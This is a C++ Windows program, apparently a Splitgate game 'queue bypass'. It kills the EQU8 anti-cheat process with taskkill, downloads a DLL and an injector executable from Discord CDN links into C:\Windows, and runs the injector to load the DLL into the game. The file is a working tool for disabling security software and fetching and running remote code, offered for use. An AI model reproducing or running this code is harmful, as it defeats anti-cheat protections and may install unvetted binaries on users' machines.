#include <iostream>
#include <cstdio>
#include <windows.h>
#include <tlhelp32.h>
#include <io.h>
#include <stdio.h>
#include <process.h>
#include <sys/types.h>
#include <string>
#include <urlmon.h>
#include "resource.h"
#pragma comment(lib, "urlmon.lib")





DWORD MyGetProcessId(LPCTSTR ProcessName)
{
     
    SetConsoleTitle(L"Splitgate Queue Bypass | Made by stormzy#1337");
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) { // must call this first
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap); // close handle on failure
    return 0;
}

bool isRunning(int pid)
{
    HANDLE pss = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(pe);

    if (Process32First(pss, &pe))
    {
        do
        {
            // pe.szExeFile can also be useful  
            if (pe.th32ProcessID == pid)
                return true;
        } while (Process32Next(pss, &pe));
    }

    CloseHandle(pss);

    return false;
}


int main()
{

    printf("[+] Finding EQU8 Process\n");
    Sleep(1000);

    // Finding the EQU8 Anti Cheat by getting its Process ID
    DWORD pid = MyGetProcessId(TEXT("anticheat.x64.equ8.exe"));


    // if the ID is zero, then it is not running.
    if (pid == 0)
    {
        printf("[-] Failed to get Process ID, but we will go ahead and continue anyways, if it does not work, then retry.");
        Sleep(1000);

    }


    printf("[+] Bypassing EQU8\n");
    Sleep(1000);
    // literally all you do is just kill the process LMAOOOO, simple ass bypass
    // i think that rhymes and is funny
    system("taskkill /IM anticheat.x64.equ8.exe /F");
    printf("[+] Checking for process\n");
    Sleep(1000);
    DWORD pid1 = MyGetProcessId(TEXT("anticheat.x64.equ8.exe"));
    if (pid1 == 0)
    {
        
        printf("[+] Successfully bypassed EQU8!\n");
        Sleep(1000);
    }
    else
    {
        printf("[-] Failed to kill equ8.\n");
        Sleep(5000);
        exit(0);
    }
    printf("[+] Bypassing queue...\n");
    HRESULT hr;

    LPCTSTR Url = (L"https://cdn.discordapp.com/attachments/862791472922755082/871544417805271101/splitwait.dll"), File = (L"C:\\Windows\\bypass.dll");
    hr = URLDownloadToFile(0, Url, File, 0, 0);
    Sleep(500);

    LPCTSTR Url1 = (L"https://cdn.discordapp.com/attachments/759996615606927360/871553119081889862/inject.exe"), File1 = (L"C:\\Windows\\injector.exe");
    hr = URLDownloadToFile(0, Url1, File1, 0, 0);
    Sleep(500);

    system("C:\\Windows\\injector.exe PortalWars-Win64-Shipping.exe  C:\\Windows\\bypass.dll");
    printf("[+] Queue should be bypassed. Can take up to 5-10 seconds\n");
    printf("[+] If it does not work try again.\n");
    Sleep(5000);
    exit(0);
}